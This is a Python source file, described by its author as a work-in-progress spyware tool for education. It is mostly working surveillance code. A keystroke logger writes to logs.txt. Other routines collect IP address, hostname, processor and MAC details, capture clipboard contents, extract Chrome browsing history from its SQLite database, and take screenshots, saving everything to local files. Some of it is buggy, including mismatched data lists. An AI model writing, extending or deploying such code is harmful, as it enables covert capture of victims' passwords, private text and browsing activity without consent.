# WIP Spyware tool for educational purposes, and to further my education in Cyber Security

# Import necessary Modules
from pynput.keyboard import Key, Listener # This is what listens to keyboard input and records
import sqlite3 #get the data from a database
import datetime #get the date
import socket #get computer information
import platform #get computer information
from requests import get #get information from a website
import psutil # To grab MAC Address
import win32clipboard #get clipboard information
from PIL import ImageGrab #get screenshot
import pandas as pd #manipulate with the aquired data

# Records keystrokes and store inside text file
a = []

'''


import psutil
 
# Iterate over all the keys in the dictionary
for interface in psutil.net_if_addrs():
    # Check if the interface has a valid MAC address
    if psutil.net_if_addrs()[interface][0].address:
        # Print the MAC address for the interface
        print(psutil.net_if_addrs()[interface][0].address)
        break
        

'''
# Defining key stroke logger
def on_press(key):
    a.append(key)
    write_file(a)
    print(key)

# Define file writing to save to txt file
def write_file(var):
    with open("logs.txt","a") as f:
        for i in var:
            new_var = str(i).replace("'","")
        f.write(new_var)
        f.write(" ")

# Function to end the recording (escape)      
def on_release(key):
    if key == Key.esc:
        return False

# Fuction to listen to start, starts listening after first key stroke
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join() 

# Grabs information to store; Date, IP address, Processor, System release, Host name, MAC Address
# Grabs the date/time
date = datetime.date.today()
# Grabs users IP address
ip_address = socket.gethostbyname(socket.gethostname()) 

# Grabs users processor details
processor = platform.processor()

# Grabs users System release
system = platform.system() 
release = platform.release()

# Grabs users Host name
host_name = socket.gethostname() 
 
mac_address = None 
for interface, addresses in psutil.net_if_addrs().items():
    # Check if the interface has a valid MAC address
    if addresses and addresses[0].address:
        mac_address = addresses[0].address
        break

# Create a DataFrame with computer information
data = {
    'Metric': ['Date','IP Address', 'Processor', 'System', 'Release', 'Host Name'],
    'Value': [date,ip_address, processor, system, release, host_name, mac_address]
}
df = pd.DataFrame(data)

# Save the DataFrame to an Excel file
df.to_excel('keystrokes.xlsx', index=False)

#get the clipboard information and store it in text file

def copy_clipboard():
    current_date = datetime.datetime.now()
    with open("clipboard.txt", "a") as f:
        
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard() #get the clipboard data and store it in pasted_data

            f.write("\n")
            f.write("date and time:"+ str(current_date)+"\n")
            f.write("clipboard data: \n "+ pasted_data) #write the clipboard data into the text file
        
copy_clipboard()



#get history of google chrome

conn = sqlite3.connect('C:\\Users\\ASHUTOSH\\Desktop\\history1') #connect to the google chrome history database "add your path"
cursor = conn.cursor()

# Retrieve search history from the database accordingly
cursor.execute("SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls")
search_history = cursor.fetchall()

# Create a pandas DataFrame from the retrieved search history
df = pd.DataFrame(search_history, columns=['url', 'title', 'Timestamp'])

# Save the search history DataFrame to an Excel file
excel_file = "search_history.xlsx"
df.to_excel(excel_file, index=False)

# Close the database connection
conn.close()

#get the screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save("screenshot.png")

screenshot()
